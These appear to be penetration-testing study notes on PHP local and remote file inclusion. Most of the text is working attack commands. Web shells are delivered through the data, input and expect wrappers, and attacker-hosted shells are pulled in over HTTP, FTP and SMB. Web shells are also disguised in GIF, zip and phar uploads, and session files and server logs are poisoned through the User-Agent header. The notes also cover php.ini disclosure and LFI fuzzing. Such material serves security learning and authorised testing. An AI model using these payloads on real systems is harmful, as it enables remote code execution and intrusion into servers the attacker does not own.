# File Inclusion
- [PHP Wrappers](#php-wrappers)
    - [Data](#1-data)
    - [Input](#2-input)
    - [Expect](#3-expect)
- [Remote File Inclusion (RFI)](#remote-file-inclusion-rfi)
- [LFI and File Uploads](#lfi-and-file-uploads)
    - [Image Upload](#image-upload)
    - [ZIP Upload](#zip-upload)
    - [Phar Upload](#phar-upload)
- [Log Poisoning](#log-poisoning)
- [Server Log Poisoning](#server-log-poisoning)

--------------------------------------------------------------------------------------------------------
- **PHP Filters**
    - PHP Filters are a type of PHP wrappers, where we can pass different types of input and have it filtered by the filter we specify.
    - To use PHP wrapper streams, we can use the php:// scheme in our string, and we can access the PHP filter wrapper with php://filter/.

    - Source Code Disclosure:
    ```url
    php://filter/read=convert.base64-encode/resource=config
    ```

## PHP Wrappers    
### Data
- The data wrapper can be used to include external data, including PHP code. 
- However, the data wrapper is only available to use if the (allow_url_include) setting is enabled in the PHP configurations.
- **Checking PHP Configurations**
    - To do so, we can include the PHP configuration file found at (`/etc/php/X.Y/apache2/php.ini`) for Apache or at (`/etc/php/X.Y/fpm/php.ini`) for Nginx, where X.Y is your install PHP version. 
    - We can start with the latest PHP version, and try earlier versions if we couldn't locate the configuration file.
    ```bash
    curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
    ```
    - Once we have the base64 encoded string, we can decode it and grep for allow_url_include to see its value:
    ```bash
    echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

    allow_url_include = On
    ```
- **Remote Code Execution**
    - With allow_url_include enabled, we can proceed with our data wrapper attack. 
    - As mentioned earlier, the data wrapper can be used to include external data, including PHP code.
    - First step would be to base64 encode a basic PHP web shell, as follows:
    ```bash
    echo '<?php system($_GET["cmd"]); ?>' | base64

    PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
    ```
    - Now, we can URL encode the base64 string, and then pass it to the data wrapper with `data://text/plain;base64,`. Finally, we can use pass commands to the web shell with `&cmd=<COMMAND>`:
    ```bash
    curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
    ```

### Input
- Similar to the data wrapper, the input wrapper can be used to include external input and execute PHP code. 
- The difference between it and the data wrapper is that we pass our input to the input wrapper as a POST request's data. 
- So, the vulnerable parameter must accept POST requests for this attack to work.
```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> [!NOTE]
> To pass our command as a GET request, we need the vulnerable function to also accept GET request (i.e. `use $_REQUEST`). If it only accepts POST requests, then we can put our command directly in our PHP code, instead of a dynamic web shell (e.g. `<\?php system('id')?>`)

### Expect
- Finally, we may utilize the expect wrapper, which allows us to directly run commands through URL streams.
- However, expect is an external wrapper, so it needs to be manually installed and enabled on the back-end server, though some web apps rely on it for their core functionality, so we may find it in specific cases.
- We can determine whether it is installed on the back-end server just like we did with allow_url_include earlier, but we'd grep for expect instead, and if it is installed and enabled we'd get the following:
```bash
echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```
- To use the expect module, we can use the expect:// wrapper and then pass the command we want to execute, as follows:
```bash
curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Remote File Inclusion (RFI)
- This allows two main benefits:

    1. Enumerating local-only ports and web applications (i.e. SSRF)
    2. Gaining remote code execution by including a malicious script that we host

- The following are some of the functions that (if vulnerable) would allow RFI:

|Function|	Read Content|	Execute	|Remote URL|
|:-------|:-------------|:----------|:---------|
|PHP|			
|include()/include_once()|	✅|	✅|	✅|
|file_get_contents()|	✅|	❌|	✅|
|Java|			
|import|	✅|	✅|	✅|
|.NET|			
|@Html.RemotePartial()|	✅|	❌|	✅|
|include|	✅|	✅|	✅|

- Any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled. 
- We can check whether this setting is enabled through LFI.
- So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. 
- At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures.
- So, Try use (http://127.0.0.1:80/index.php) as our input string and see if it gets included

> [!WARNING]
> It may not be ideal to include the vulnerable page itself (i.e. index.php), as this may cause a recursive inclusion loop and cause a DoS to the back-end server.

### Remote Code Execution with RFI
- Host web shell online:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
#### 1. HTTP
```bash
sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```
- Now, we can include our local shell through RFI, like we did earlier, but using `<OUR_IP>` and our `<LISTENING_PORT>`. We will also specify the command to be executed with `&cmd=id`:
```url
http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```

#### 2. FTP
- As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's pyftpdlib, as follows:
```bash
sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```
- This may also be useful in case http ports are blocked by a firewall or the http:// string gets blocked by a WAF. To include our script, we can repeat what we did earlier, but use the ftp:// scheme in the URL, as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id
```
- By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:
```bash
curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

#### 3. SMB
- If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the `allow_url_include` setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion.
- This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.
- We can spin up an SMB server using Impacket's smbserver.py, which allows anonymous authentication by default, as follows:
```bash
impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
- Now, we can include our script by using a UNC path (e.g. `\\<OUR_IP>\share\shell.php`), and specify the command with (`&cmd=whoami`) :
```url
http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

> [!WARNING]
> As we can see, this attack works in including our remote script, and we do not need any non-default settings to be enabled. 
> However, we must note that this technique is more likely to work if we were on the same network, as accessing remote SMB servers over the internet may be disabled by default, depending on the Windows server configurations.



## LFI and File Uploads
### Image upload
- Crafting Malicious Image
```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
- We need to know the path to our uploaded file.
- In most cases, especially with images, we would get access to our uploaded file and can get its path from its URL.
```url
http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

> [!NOTE]
> To include to our uploaded file, we used ./profile_images/ as in this case the LFI vulnerability does not prefix any directories before our input.
> In case it did prefix a directory before our input, then we simply need to ../ out of that directory and then use our URL path

### Zip Upload
> [!IMPORTANT] 
> This wrapper isn't enabled by default, so this method may not always work.

- To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named shell.jpg), as follows:
```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```
> [!TIP]
>  Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

- Once we upload the shell.jpg archive, we can include it with the zip wrapper as (zip://shell.jpg), and then refer to any files within it with `#shell.php` (URL encoded). Finally, we can execute commands as we always do with `&cmd=id`, as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```
### Phar Upload
- We can use the phar:// wrapper to achieve a similar result. 
- To do so, we will first write the following PHP script into a shell.php file:
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
- This script can be compiled into a phar file that when called would write a web shell to a shell.txt sub-file, which we can interact with. 
- We can compile it into a phar file and rename it to shell.jpg as follows:
```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
- Now, we should have a phar file called shell.jpg. 
- Once we upload it to the web application, we can simply call it with phar:// and provide its URL path, and then specify the phar sub-file with /shell.txt (URL encoded) to get the output of the command we specify with (`&cmd=id`), as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

## Log Poisoning
- Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies.
- These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\Windows\Temp\ on Windows.
- The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. 
- For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.

- Try include this session file through the LFI vulnerability and view its contents:
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
- We can observe which value is under our control,in this example we can control it through the ?language= parameter.
- Try setting the value of page a custom value (e.g. language parameter) and see if it changes in the session file. We can do so by simply visiting the page with ?language=session_poisoning specified, as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```
- Now, let's include the session file once again to look at the contents:
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
- Our next step is to perform the poisoning step by writing PHP code to the session file. We can write a basic PHP web shell by changing the ?language= parameter to a URL encoded web shell, as follows:
```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```
- Finally, we can include the session file and use the &cmd=id to execute a commands:
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```
> [!IMPORTANT]
> To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.

## Server Log Poisoning
- Both Apache and Nginx maintain various log files, such as access.log and error.log. 
- The access.log file contains various information about all requests made to the server, including each request's User-Agent header. 
- As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above.

- By default, Apache logs are located in `/var/log/apache2/` on Linux and in `C:\xampp\apache\logs\` on Windows, while Nginx logs are located in `/var/log/nginx/` on Linux and in `C:\nginx\log\` on Windows.


- Try including the Apache access log from /var/log/apache2/access.log, and see what we get:
```url
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```
- As mentioned earlier, the User-Agent header is controlled by us through the HTTP request headers, so we should be able to poison this value.
- To do so, we will use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to Apache Log Poisoning
- Observe whether our custom User-Agent value is visible in the included log file. If poisoned successfully,then we can poison the User-Agent header by setting it to a basic PHP web shell:
```bash
echo -n "User-Agent: <?php system($_GET['cmd']); ?>" > Poison
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```
- As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (`&cmd=id`).


> [!TIP]
> The User-Agent header is also shown on process files under the Linux `/proc/` directory. So, we can try including the `/proc/self/environ` or `/proc/self/fd/N` files (where N is a PID usually between 0-50), and we may be able to perform the same attack on these files. This may become handy in case we did not have read access over the server logs, however, these files may only be readable by privileged users as well.

- Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:
    - `/var/log/sshd.log`
    - `/var/log/mail`
    - `/var/log/vsftpd.log`
- We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. 
- For example, if the ssh or ftp services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. 
- The same applies the mail services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute.
- We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.

## Automation
- LFI wordlists
```
ffuf -w /opt/useful/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
```
- We can use this [wordlist for Linux](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux) or this[ wordlist for Windows](https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows)
```bash
ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287
```
- Tools
    - [liffy](https://github.com/mzfr/liffy)
    - [LFISuite](https://github.com/D35m0nd142/LFISuite)


## Testing 
- Bypasses
    - [ ] Check non-recursive path traversal filters
    - [ ] Try list of path traversal payloads (Encoding, path truncation)
    - [ ] Check for appended extension e.g. .php, .aspx
    - [ ] Try Null byte `%00` , fragment `#` (/etc/passwd%00.php)
